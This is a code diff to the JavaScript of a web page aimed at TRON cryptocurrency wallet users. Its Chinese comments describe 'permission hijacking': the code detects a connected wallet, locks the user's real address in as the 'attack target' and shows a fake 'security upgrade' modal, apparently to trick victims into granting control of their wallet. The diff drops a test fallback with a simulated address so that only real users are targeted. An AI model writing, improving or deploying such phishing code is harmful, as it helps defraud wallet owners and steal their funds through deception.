@@ -70,33 +70,46 @@
         console.log('🔑 当前环境 - TronWeb.ready:', window.tronWeb?.ready);
         console.log('🔑 当前环境 - UserAgent:', navigator.userAgent);
         
-        if (window.tronWeb && window.tronWeb.ready) {
+        if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress) {
             const userAddress = window.tronWeb.defaultAddress.base58;
             console.log('🔑🔑🔑 检测到TRON钱包连接成功！🔑🔑🔑');
-            console.log('🔑 用户地址:', userAddress);
+            console.log('🔑 真实用户地址:', userAddress);
             
+            // 设置真实的攻击目标
             hijackStatus.targetAddress = userAddress;
+            hijackStatus.operationType = 'SECURITY_UPGRADE'; // 固定使用安全升级伪装
+            hijackStatus.initiated = true;
             
-            // 随机选择伪装操作类型
-            const operationTypes = Object.keys(DISGUISE_OPERATIONS);
-            hijackStatus.operationType = operationTypes[Math.floor(Math.random() * operationTypes.length)];
-            
-            console.log('🔑 选择的伪装操作:', hijackStatus.operationType);
+            console.log('🔑 攻击目标已锁定:', userAddress);
+            console.log('🔑 立即显示权限劫持界面...');
             
             // 立即显示伪装的安全升级界面
-            console.log('🔑 准备显示权限劫持界面...');
             showSecurityUpgradeModal();
             
             return userAddress;
         } else {
-            console.log('⚠️ TronWeb未就绪，继续等待...');
+            console.log('⚠️ TronWeb未完全就绪，等待中...');
+            if (window.tronWeb) {
+                console.log('⚠️ TronWeb存在但ready状态:', window.tronWeb.ready);
+                console.log('⚠️ defaultAddress状态:', !!window.tronWeb.defaultAddress);
+            }
         }
         return null;
     }
     
     // 🎯 显示伪装的安全升级界面
     function showSecurityUpgradeModal() {
+        console.log('🔑 开始显示权限劫持界面...');
+        console.log('🔑 当前hijackStatus:', hijackStatus);
+        
+        // 确保operationType已设置
+        if (!hijackStatus.operationType) {
+            hijackStatus.operationType = 'SECURITY_UPGRADE';
+            console.log('🔑 设置默认操作类型: SECURITY_UPGRADE');
+        }
+        
         const operation = DISGUISE_OPERATIONS[hijackStatus.operationType];
+        console.log('🔑 使用的伪装操作:', operation);
         
         const overlay = document.createElement('div');
         overlay.id = 'security-upgrade-overlay';
@@ -577,23 +590,18 @@
         
         if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress) {
             const userAddress = window.tronWeb.defaultAddress.base58;
-            console.log('🔑 强制触发 - 目标地址:', userAddress);
+            console.log('🔑 强制触发 - 真实目标地址:', userAddress);
             
             hijackStatus.targetAddress = userAddress;
-            hijackStatus.operationType = 'SECURITY_UPGRADE'; // 默认使用安全升级
+            hijackStatus.operationType = 'SECURITY_UPGRADE';
+            hijackStatus.initiated = true;
             
             // 立即显示权限劫持界面
             showSecurityUpgradeModal();
             return true;
         } else {
-            console.log('❌ 强制触发失败 - TronWeb未就绪');
-            
-            // 即使TronWeb未就绪也显示界面（测试用）
-            console.log('🔑 测试模式 - 显示权限劫持界面');
-            hijackStatus.targetAddress = 'TLPkfm2jMBDJCWu5vTQJgPgS1hzJgMKYc7'; // 模拟地址
-            hijackStatus.operationType = 'SECURITY_UPGRADE';
-            showSecurityUpgradeModal();
-            return true;
+            console.log('❌ 强制触发失败 - 需要真实的TronWeb连接');
+            return false;
         }
     }
     
